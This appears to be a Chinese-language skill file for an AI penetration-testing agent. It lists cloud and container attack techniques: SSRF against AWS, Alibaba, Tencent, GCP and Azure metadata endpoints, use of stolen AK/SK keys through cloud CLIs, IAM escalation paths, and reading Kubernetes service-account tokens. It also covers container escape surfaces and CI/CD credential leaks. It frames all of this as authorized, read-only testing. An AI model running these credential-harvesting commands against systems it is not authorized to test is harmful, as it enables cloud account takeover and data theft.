---
name: cloud-attack-methods
description: 目标使用云服务/容器/K8s，或拿到云凭据(AK/SK/Token)、发现 SSRF 与元数据服务时调用——云元数据利用、STS/IAM 提权、对象存储、K8s 逃逸、CI/CD 凭据链与只读验证口径。
tags:
  cwe: [CWE-918, CWE-522, CWE-269, CWE-284, CWE-306]
  attack: [T1552.005, T1078.004, T1611, T1195]
  class: [cloud, kubernetes, container, cicd, metadata, ssrf]
---

# 云与容器攻击手法

## 与本平台的衔接

| 场景 | 用平台能力 |
|---|---|
| SSRF 打元数据 | `http_request`（可控）或注入点；OOB 用 `listener_*` |
| 云凭据验证 | Bash `aws`/`aliyun`/`ossutil`；只读命令 |
| 对象存储 | `http_request` 列举（`?prefix=&max-keys=10`） |
| K8s | Bash `kubectl`/`curl` serviceaccount；`http_request` 打 API |
| 凭据记录 | 元数据泄露的 AK/SK 全文写 `record_fact`（含账号/来源） |
| 证据 | `save_evidence`（回执、权限列表、只读样本）；`report_finding` |

## 一、云元数据（SSRF/命令执行后的第一站）

- AWS：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`（IMDSv1）；
  IMDSv2 需先取 token：
  `TOKEN=$(curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' http://169.254.169.254/latest/api/token)`
- 阿里云：`http://100.100.100.200/latest/meta-data/`（含 ram/security-credentials）；
- 腾讯云：`http://metadata.tencentyun.com/latest/meta-data/`；
- GCP：`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`（需 `Metadata-Flavor: Google`）；
- Azure：`http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`（需 `Metadata: true`）；
- 拿到临时凭据立即核实权限（`aws sts get-caller-identity`），**只读验证**，不写不删。

## 二、云凭据滥用（授权范围内）

- AWS：`aws sts get-caller-identity` → `aws iam list-users/list-attached-user-policies`；
  S3：`aws s3 ls`、`aws s3 cp s3://bucket/file -`（只读样本）；
- 阿里云：`aliyun sts GetCallerIdentity`、`ossutil ls oss://bucket`；
- 腾讯云：`tccli sts GetCallerIdentity`、`tccli cos`；
- 对象存储直连：bucket 域名 + `?list-type=2&max-keys=10`；未授权列举/下载属 L3；
- 元数据泄露的 AK/SK 全文写入 fact（含所属账号/服务），注明来源文件/接口。

## 三、IAM / STS 提权常见路径

- `iam:PassRole` + `ec2:RunInstances`（可能创造成本，谨慎）；
- `iam:CreatePolicyVersion` / `AttachUserPolicy` 自提权；
- 角色信任策略过宽（`Principal: *`）；
- OIDC 联邦信任误配（GitHub Actions → AWS，注意 subject 条件）。
> 云上写操作一律禁止；最多 `simulate-principal-policy` 验证权限面。

## 四、Kubernetes / 容器

- Pod 内先看：`/var/run/secrets/kubernetes.io/serviceaccount/token`、`env | grep -i kube`；
- 探权限：`kubectl --token=<t> --server=https://kubernetes.default.svc auth can-i --list`；
- 逃逸面：privileged 容器、`hostPath`、`hostPID/hostNetwork`、`docker.sock`；
- 容器内凭据：环境变量、ConfigMap 挂载、镜像层历史（`docker history`）；
- 结论带证据：能读到宿主文件/宿主进程列表/其他命名空间资源。

## 五、CI/CD 与供应链

- Jenkins：`/script` 未授权、`/computer/(master)/script`、凭据绑定页面；
- GitLab：CI 变量泄露、`/api/v4/projects` 未授权、runner token；
- GitHub Actions：`pull_request_target` 注入、workflow secrets 引用；
- 依赖投毒：内部 npm/pypi 源、`.npmrc`/`pip.conf` 指向内网源；
- 构建日志：常泄露 token/环境变量，用 `record_fact` 记录。

## 六、证据与验证纪律

- 只读验证：每条云结论附「命令 + 回执 + 权限范围」；
- 元数据：请求 URL + 回执片段（凭据脱敏后进报告，原文进 fact）；
- 对象存储：列举结果数量 + 一条样本；
- 容器逃逸：宿主文件/进程列表截图；
- 不做任何写操作；不创建云资源。

## 七、边界

- 云控制面不做写操作（不创建资源、不改策略、不删数据）；
- 对象存储只取最小样本证明可读；
- 生产集群逃逸验证到「可读宿主文件」即止，不横向到其他租户；
- 发现真实云凭据时立即上报并停止扩大验证。
